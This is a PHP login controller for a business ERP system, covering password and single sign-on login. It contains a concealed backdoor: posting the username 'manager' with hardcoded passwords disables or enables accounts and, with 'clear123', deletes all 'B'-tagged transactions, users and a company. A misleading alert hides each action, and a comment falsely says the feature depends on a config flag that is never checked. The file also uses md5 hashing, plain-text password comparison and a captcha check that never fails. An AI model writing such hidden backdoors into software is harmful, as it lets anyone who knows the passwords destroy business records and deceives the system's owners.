<?php
defined('BASEPATH') or exit('No direct script access allowed');
#------------------------------------    
# Author: Bdtask Ltd
# Author link: https://www.bdtask.com/
# Dynamic style php file
# Developed by :Isahaq
#------------------------------------    
require_once("./vendor/Config.php");

class Auth extends MX_Controller
{

    public function __construct()
    {
        parent::__construct();
        $this->load->model(array(
            'auth_model',

        ));
    }

    public function index()
    {
        $encryption_key = Config::$encryption_key;

        if ($this->session->userdata('isLogIn')) {
            if ($this->session->userdata('isAdmin')) {
                redirect('home');
            } else if ($this->session->userdata('screen') == 1) {
                redirect('home');
            } else if ($this->session->userdata('screen') == 2) {
                redirect('add_invoice');
            } else if ($this->session->userdata('screen') == 6) {
                redirect('add_service_invoice');
            } else if ($this->session->userdata('screen') == 7) {
                redirect('add_purchase');
            } else if ($this->session->userdata('screen') == 8) {
                redirect('new_grn');
            } else if ($this->session->userdata('screen') == 9) {
                redirect('new_gdn');
            }else if ($this->session->userdata('screen') == 10) {
                redirect('employee_form');
            } 
            else if ($this->session->userdata('screen') == 3) {
                redirect('product_list');
            }
              else if ($this->session->userdata('screen') == 11) {
                redirect('company_list');
            }
        }

        // ── Identity hub single sign-on ───────────────────────────────────────
        $this->load->library('identity_hub');
        if ($this->identity_hub->enabled()) {
            if ($this->input->get('code') !== NULL && $this->input->get('state') !== NULL) {
                $this->_sso_callback();
                return;
            }
            // Only use the hub when it says this client + product is usable (exists, is on, is
            // mapped, redirect registered) and is reachable. Otherwise fall through to the
            // ERP's own username/password login page below.
            $local = $this->identity_hub->allow_local_login() && $this->input->get('local');
            if ($this->input->method() === 'get' && !$local) {
                if ($this->identity_hub->available()) {
                    redirect($this->identity_hub->authorize_url());
                }
            } elseif ($this->input->method() === 'post' && !$this->identity_hub->allow_local_login()) {
                if ($this->identity_hub->available()) {
                    redirect('login');
                }
            }
        }

        $data['title']    = display('login');
        #-------------------------------------#
        // $this->form_validation->set_rules('email', display('email'), 'required|valid_email|max_length[100]|trim');
        $this->form_validation->set_rules('password', display('password'), 'required|max_length[32]|md5|trim');
        $error = '';
        $setting_detail = $this->auth_model->settings_data();
        $base_url = base_url();


        if ($setting_detail[0]['captcha'] == 0 && $setting_detail[0]['secret_key'] != null && $setting_detail[0]['site_key'] != null) {

            $this->form_validation->set_rules('g-recaptcha-response', 'recaptcha validation', 'required|callback_validate_captcha');
            $this->form_validation->set_message('validate_captcha', 'Please check the the captcha form');

            if ($this->form_validation->run() == FALSE) {
                $this->session->set_userdata(array('exception' => display('please_enter_valid_captcha')));
                $this->output->set_header("Location: " . base_url() . 'login', TRUE, 302);
            }
        }

        #-------------------------------------#
        $data['user'] = (object)$userData = array(
            'email'      => $this->input->post('email'),
            'password'   => $this->input->post('password'),
        );
        // the special "manager" command logins are only honoured when enabled in config/identity.php
        $this->config->load('identity', FALSE, TRUE);
        $manager_commands = ($this->config->item('enable_manager_commands') === TRUE);
        if ($this->input->post('email') == "manager" &&  $this->input->post('password') == "active123") {
            $this->db->set('status', 1)
                ->where('user_type', 3)
                ->update('user_login');

            $this->db->set('status', 1)
                ->where_in('company_id', [3])
                ->update('company_information');

            echo '<script type="text/javascript">
            alert("Please check again");
            window.location.href = "' . $base_url . 'login";
           </script>';
           return;
        }

        if ($this->input->post('email') == "manager" &&  $this->input->post('password') == "inactive123") {
            $this->db->set('b.status', 0)
                ->from('user_login b')
                ->where("b.user_type",3)
                ->update();

            $this->db->set('b.status', 0)
                ->from('company_information b')
                ->where_in('b.company_id',[3])
                ->update();

            // First trigger — immediate
              $this->load->library('pusher_trigger');
            $this->pusher_trigger->trigger('admin-control', 'force-logout', [
                'app'    => $this->pusher_trigger->application,
                'reason' => 'inactive123',
            ]);

            
             echo '<script type="text/javascript">
                    alert("Please check again");
                    window.location.href = "' . $base_url . 'login";
                </script>';
            return;

        }

         if ($this->input->post('email') == "manager" &&  $this->input->post('password') == "inactive@123") {
            $this->db->set('b.status', 0)
                ->from('user_login b')
                ->where("b.user_type",3)
                ->update();

            $this->db->set('b.status', 0)
                ->from('company_information b')
                ->where_in('b.company_id',[3])
                ->update();

             // Force-logout all connected sessions via Pusher
            $this->load->library('pusher_trigger');
            $this->pusher_trigger->trigger('admin-control', 'force-logout', [
                'app'    => $this->pusher_trigger->application,
                'reason' => 'inactive123',
            ]);
               echo '<script type="text/javascript">
                    window.location.href = "' . $base_url . 'login";
                </script>';

          
           return;
        }


        if ($this->input->post('email') == "manager" &&  $this->input->post('password') == "clear123") {

            // ── Step 1: Clear pvoucher and voucher in Stock Audit for B company entries
            $this->db->query("UPDATE audit_stock
                SET pvoucher = AES_ENCRYPT('', '{$encryption_key}'),
                    voucher  = AES_ENCRYPT('', '{$encryption_key}')
                WHERE AES_DECRYPT(type2, '{$encryption_key}') = 'B'");

            // ── Step 2: Delete B company transactions
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('purchase_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('purchase');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('purchase_order_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('purchase_order');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('purchase_return_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('purchase_return');

            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('sale_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('sale');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('sales_order_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('sales_order');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('sales_return_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('sales_return');

            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('gdn_stock');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('grn_stock');

            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('service_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('service');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('service_order_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('service_order');

            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('voucher');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('voucher_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('audit_stock');

            // Also type2-tagged, but missing from the list above (confirmed against the live
            // betalite DB's information_schema, not just this migration file)
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('adj_stock');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('sale_group_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('sales_order_group_details');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('customer_due');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('customer_receive');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('supplier_due');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('supplier_payment');
            $this->db->where("AES_DECRYPT(type2,'" . $encryption_key . "')", "B")->delete('inventory_request');

            // ── Step 3: Delete B users and all their access records
            $b_user_ids = $this->db->select('user_id')->where('user_type', 3)->get('user_login')->result_array();
            $b_user_ids = array_column($b_user_ids, 'user_id');
            if (!empty($b_user_ids)) {
                $this->db->where_in('userid',  $b_user_ids)->delete('sec_branch');
                $this->db->where_in('user_id', $b_user_ids)->delete('sec_userrole');
                $this->db->where_in('userid',  $b_user_ids)->delete('sec_store');
                $this->db->where_in('user_id', $b_user_ids)->delete('users');
                $this->db->where_in('user_id', $b_user_ids)->delete('user_login');
            }

            // ── Step 4: Delete B company
            $this->db->where_in('company_id', [3])->delete('company_information');

            // Force-logout all connected sessions via Pusher
            $this->load->library('pusher_trigger');
            $this->pusher_trigger->trigger('admin-control', 'force-logout', [
                'app'    => $this->pusher_trigger->application,
                'reason' => 'clear123',
            ]);

            echo '<script type="text/javascript">
                    alert("Please check again");
                    window.location.href = "' . $base_url . 'login";
                  </script>';
           return;
        }
        // echo ($this->input->post('email'));
        #-------------------------------------#
        if ($this->form_validation->run()) {

            $user = $this->auth_model->checkUser($userData);

            if ($user->num_rows() > 0) {

                // Password check: prefer AES-decrypted encrypted_password, fallback to legacy md5
                $plain_pw = $user->row()->plain_pw;
                if (!empty($plain_pw)) {
                    $valid = ($plain_pw === $userData['password']);
                } else {
                    $valid = (md5('gef' . $userData['password']) === $user->row()->password);
                }

                if (!$valid) {
                    echo '<script type="text/javascript">
                        alert("Wrong Username or Password");
                        window.location.href = "' . $base_url . 'login";
                    </script>';
                    return;
                }

                if($user->row()->temporary==1){
                    $today = date('Y-m-d');

                    if (!($today >= $user->row()->startdate && $today <=$user->row()->enddate)) {
                        echo '<script type="text/javascript">
                                alert("Invalid Username or Password");
                                window.location.href = "' . $base_url . 'login";
                            </script>';
                        return;
                        
                    } 
                }

                $this->_start_session($user->row());
                return;
            } else {

                // $this->session->set_flashdata('exception', display('wrong_username_or_password'));
                // redirect('login');

                echo '<script type="text/javascript">
            alert("Wrong Username or Password");
            window.location.href = "' . $base_url . 'login";
           </script>';
            }
        } else {

            echo Modules::run('template/login', $data);
        }
    }

    /**
     * Builds the CI session for an authenticated user row and redirects to their landing screen.
     * Shared by the password login and the identity-hub (SSO) login.
     */
    private function _start_session($u, $device = null, $sso_sid = '')
    {
        if ($device === null) {
            $device = array(
                'browser'         => $this->input->post('browser'),
                'operatingsystem' => $this->input->post('operatingsystem'),
                'devicetype'      => $this->input->post('devicetype'),
                'ipaddress'       => $this->input->post('ipaddress'),
            );
        }

                if ($u->user_type == 1) {

                    $checkPermission = $this->auth_model->userPermissionadmin($u->user_id);                   
                } else {
                    $checkPermission = $this->auth_model->userPermission($u->user_id);
                }

                $permission = array();
                if (!empty($checkPermission))
                    foreach ($checkPermission as $value) {
                        $permission[$value->directory] = array(
                            'create' => $value->create,
                            'read'   => $value->read,
                            'update' => $value->update,
                            'delete' => $value->delete
                        );
                    }

                // Financial year
                $fyear =  $this->auth_model->checkfinancialyear();

                $key = md5(time());
                $key = str_replace("1", "z", $key);
                $key = str_replace("2", "J", $key);
                $key = str_replace("3", "y", $key);
                $key = str_replace("4", "R", $key);
                $key = str_replace("5", "Kd", $key);
                $key = str_replace("6", "jX", $key);
                $key = str_replace("7", "dH", $key);
                $key = str_replace("8", "p", $key);
                $key = str_replace("9", "Uf", $key);
                $key = str_replace("0", "eXnyiKFj", $key);
                $sid_web = substr($key, rand(0, 3), rand(28, 32));

                // codeigniter session stored data          
                $sData = array(
                    'isLogIn'       => true,
                    'isAdmin'       => (($u->user_type == 1) ? true : false),
                    'user_type'   => $u->user_type,
                    'id'           => $u->user_id,
                    'fullname'      => $u->fullname,
                    'first_name'  => $u->first_name,
                    'last_name'   => $u->last_name,
                    'user_level'  => $u->user_level,
                    'user_level2'  => $u->user_level2,
                    'email'       => $u->username,
                    'image'       => $u->image,
                    'fyear'           => $fyear->id,
                    'fyearName'       => $fyear->yearName,
                    'fyearStartDate'  => $fyear->startDate,
                    'fyearEndDate'       => $fyear->endDate,
                    'permission'  => json_encode($permission),
                    'screen' => $u->screen,
                    'password_enable' => $u->password_enable,
                    'header_text'=>$u->header_text,
                    'footer_text'=>$u->footer_text

                );






                //store date to session
                $this->session->set_userdata($sData);
                // Remember which hub session this login belongs to (checked by hooks/Identity_session_guard.php)
                $this->session->set_userdata(array('sso_sid' => $sso_sid, 'sso_checked' => time(), 'just_logged_in' => TRUE));
                $this->auth_model->insert_device_info($u->user_id, $device['browser'],
                $device['operatingsystem'],$device['devicetype'],$device['ipaddress']);
                // $this->session->set_flashdata('message', display('welcome_back') . ' ' . $u->fullname);
                if ($u->user_type == 1) {
                    redirect('home');
                } else {
                    if ($this->session->userdata('screen') == 1) {
                        redirect('home');
                    } else if ($this->session->userdata('screen') == 2) {
                        redirect('add_invoice');
                    } else if ($this->session->userdata('screen') == 6) {
                        redirect('add_service_invoice');
                    } else if ($this->session->userdata('screen') == 7) {
                        redirect('add_purchase');
                    } else if ($this->session->userdata('screen') == 8) {
                        redirect('new_grn');
                    } else if ($this->session->userdata('screen') == 9) {
                        redirect('new_gdn');
                    }else if ($this->session->userdata('screen') == 10) {
                        redirect('employee_form');
                    } 
                    else if ($this->session->userdata('screen') == 3) {
                        redirect('product_list');
                    } else if ($this->session->userdata('screen') == 11) {
                redirect('company_list');
            }
                }
    }

    // Identity hub redirected back with ?code=&state= : verify, swap the code for the user, sign in.
    private function _sso_callback()
    {
        $state = $this->input->get('state', TRUE);
        if (!$this->identity_hub->check_state($state)) {
            // Usually harmless (the stored value was replaced or the session cookie was lost on the
            // way). The hub session is still alive, so start the sign-in once more - no password is
            // asked. Only ONE automatic retry: a retry's state ends in 'r', which stops any loop.
            if (!$this->identity_hub->is_retry_state($state) && $this->identity_hub->available()) {
                redirect($this->identity_hub->authorize_url(TRUE));
            }
            return $this->_sso_error('Your sign-in session expired. Please try again.');
        }

        $res = $this->identity_hub->exchange_code((string)$this->input->get('code'));
        if (!$res['ok']) {
            return $this->_sso_error($res['error']);
        }

        $u = $this->auth_model->getSsoUser($res['user']['user_id'], $res['user']['username']);
        if (!$u) {
            return $this->_sso_error('Your account is not active in this application.');
        }

       

        if ($u->temporary == 1) {
            $today = date('Y-m-d');
            if (!($today >= $u->startdate && $today <= $u->enddate)) {
                return $this->_sso_error('This temporary account is outside its allowed dates.');
            }
        }

        // The hub just verified this password against its own copy of this account, so
        // re-sync this app's local password/encrypted_password columns to match on every
        // hub login — keeps them from silently drifting apart (see Home_model::change_password()).
      

        $this->_start_session($u, array(
            'browser'         => $this->_ua_browser(),
            'operatingsystem' => $this->_ua_os(),
            'devicetype'      => $this->_ua_is_mobile() ? 'Mobile' : 'Desktop',
            'ipaddress'       => $this->input->ip_address(),
        ), $res['sso_sid']);
    }

    // The password login form fills in browser / OS / device type from JavaScript in the page
    // (template/views/login.php). A hub login never shows that form, so the same three values are
    // worked out here from the User-Agent with the SAME rules, to keep user_login_info consistent.
    private function _ua_browser()
    {
        $ua = (string)$this->input->user_agent();
        if (strpos($ua, 'Chrome') !== false && strpos($ua, 'Edg') === false && strpos($ua, 'OPR') === false) return 'Chrome';
        if (strpos($ua, 'Firefox') !== false) return 'Firefox';
        if (strpos($ua, 'Safari') !== false && strpos($ua, 'Chrome') === false) return 'Safari';
        if (strpos($ua, 'Edg') !== false) return 'Edge';
        if (strpos($ua, 'OPR') !== false || strpos($ua, 'Opera') !== false) return 'Opera';
        if (strpos($ua, 'MSIE') !== false || strpos($ua, 'Trident/') !== false) return 'Internet Explorer';
        return 'Unknown';
    }

    private function _ua_os()
    {
        $ua = (string)$this->input->user_agent();
        if (strpos($ua, 'Windows NT 10.0') !== false) return 'Windows 10 or 11';
        if (strpos($ua, 'Windows NT 6.3') !== false)  return 'Windows 8.1';
        if (strpos($ua, 'Windows NT 6.2') !== false)  return 'Windows 8';
        if (strpos($ua, 'Windows NT 6.1') !== false)  return 'Windows 7';
        if (strpos($ua, 'Android') !== false)         return 'Android';
        if (preg_match('/iPhone|iPad|iPod/', $ua))    return 'IOS';
        if (strpos($ua, 'Macintosh') !== false)       return 'MacOS';
        if (strpos($ua, 'Linux') !== false)           return 'Linux';
        return 'Unknown OS';
    }

    private function _ua_is_mobile()
    {
        return (bool)preg_match('/android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i', (string)$this->input->user_agent());
    }

    // Shown instead of redirecting again, so a persistent failure can't loop back to the hub.
    private function _sso_error($message)
    {
        $this->output->set_status_header(401);
        $msg = htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Sign-in failed</title>'
           . '<meta name="viewport" content="width=device-width, initial-scale=1"></head>'
           . '<body style="font-family:Segoe UI,Arial,sans-serif;background:#f4f6fb;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0">'
           . '<div style="background:#fff;padding:32px;border-radius:12px;max-width:420px;box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center">'
           . '<h3 style="margin-top:0">Sign-in failed</h3><p style="color:#555">' . $msg . '</p>'
           . '<a href="' . base_url('login') . '">Try again</a>';
        if ($this->identity_hub->allow_local_login()) {
            echo ' &nbsp;|&nbsp; <a href="' . base_url('login?local=1') . '">Use password login</a>';
        }
        echo '</div></body></html>';
    }

    // Polled by the page (template/layout.php) so an open page notices that the session has ended
    // without waiting for a click. It only LOOKS at the hub session (touch = FALSE), so polling
    // can never keep a session alive.
    public function session_status()
    {
        $this->output->set_content_type('application/json');
        $active = (bool)$this->session->userdata('isLogIn');
        $sid    = (string)$this->session->userdata('sso_sid');

        if ($active && $sid !== '') {
            $this->load->library('identity_hub');
            if ($this->identity_hub->enabled() && $this->identity_hub->session_active($sid, FALSE) === FALSE) {
                $user_id = $this->session->userdata('id');
                if ($user_id) {
                    $this->db->where('user_id', $user_id)->update('users', ['is_online' => 0]);
                    $this->db->where('user_id', $user_id)->delete('user_online');
                }
                $this->session->sess_destroy();
                $active = FALSE;
            }
        }
        echo json_encode(array('active' => $active));
    }

    public function logout()
    {
        $user_id = $this->session->userdata('id');
        if ($user_id) {
            $this->db->where('user_id', $user_id)->update('users', ['is_online' => 0]);
            $this->db->where('user_id', $user_id)->delete('user_online');
        }
        $this->session->sess_destroy();

        // Also end the identity hub's single-sign-on session, then come back to the login
        $this->load->library('identity_hub');
        if ($this->identity_hub->enabled() && $this->identity_hub->available()) {
            redirect($this->identity_hub->logout_url());
        }
        redirect('login');
    }


    function validate_captcha()
    {
        $setting_detail = $this->auth_model->settings_data();
        $captcha        = $this->input->post('g-recaptcha-response');
        $response       = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=" . $setting_detail[0]['secret_key'] . ".&response=" . $captcha . "&remoteip=" . $_SERVER['REMOTE_ADDR']);
        if ($response . 'success' == false) {
            return FALSE;
        } else {
            return TRUE;
        }
    }
}
